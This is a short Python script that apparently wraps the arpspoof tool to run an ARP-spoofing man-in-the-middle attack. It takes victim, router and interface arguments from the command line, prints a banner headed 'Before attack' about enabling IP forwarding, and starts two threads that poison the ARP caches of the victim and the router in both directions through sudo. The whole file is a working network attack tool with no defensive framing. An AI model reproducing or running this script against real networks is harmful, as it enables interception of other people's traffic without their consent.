import os
import optparse
import subprocess
import threading
from colorama import Fore,Back, Style


def get_options():
    parser = optparse.OptionParser()
    parser.add_option("-v", "--victim", dest="victim", help=" Enter the Victim IP")
    parser.add_option("-r", "--router", dest="router", help=" Enter the router IP")
    parser.add_option("-i", "--interface", dest="interface", help=" Enter the interface")

    (options, arguments) = parser.parse_args()

    return options


def before_attack():
    print(
        """Before attack : 
""" + Fore.YELLOW + "==<< ! >>== " + Style.RESET_ALL + Back.YELLOW  + """Be sure you activated IP routing. With this command you can check it << 'sudo su' >>  then << 'cat /proc/sys/net/ipv4/ip_forward' >>""" + Style.RESET_ALL + """
""" + Fore.GREEN + "==<< + >>== " + Style.RESET_ALL+ Back.GREEN  + """If you see 1 in screen, there has no problem""" + Style.RESET_ALL + """
""" + Fore.RED + "==<< - >>== " + Style.RESET_ALL + Back.RED  + """But in otherwise you need to change it...""" + Style.RESET_ALL + """
""" + Fore.CYAN + "==<< ? >>== " + Style.RESET_ALL+ Back.CYAN  + """Dou you know how to change it ?""" + Style.RESET_ALL )
    ans = input("(y[Yes]/n[N] -->")


def send_requests(v_ip, r_ip, interface):
    subprocess.call(
        ["sudo", "qterminal", "-p", ".config/qterminal.org/qterminal.ini", "-e", "arpspoof", "-i", interface,
         "-t", r_ip, v_ip])


def send_requests2(v_ip, r_ip, interface):
    subprocess.call(
        ["sudo", "qterminal", "-p", ".config/qterminal.org/qterminal.ini", "-e", "arpspoof", "-i", interface,
         "-t", v_ip, r_ip])

before_attack()
t1 = threading.Thread(target=send_requests, args=(get_options().victim, get_options().router, get_options().interface))
t2 = threading.Thread(target=send_requests2, args=(get_options().victim, get_options().router, get_options().interface))

t1.start()
t2.start()

t1.join()
t2.join()
